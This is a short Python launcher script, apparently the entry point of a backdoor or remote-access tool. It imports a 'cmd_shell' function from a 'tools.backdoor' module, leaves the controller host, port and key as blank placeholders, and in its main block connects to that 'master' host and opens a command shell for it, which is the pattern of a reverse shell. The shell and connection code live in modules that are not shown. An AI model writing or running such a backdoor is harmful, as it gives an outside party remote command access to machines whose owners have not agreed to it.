from utils.connection import connect_master
from tools.backdoor import cmd_shell


KEY = ""
master_hostname = ""
master_port = ""


if __name__ == "__main__":
    global KEY, master_hostname, master_port
    conn = connect_master(master_hostname, master_port)
    cmd_shell(conn, master_hostname, master_port)
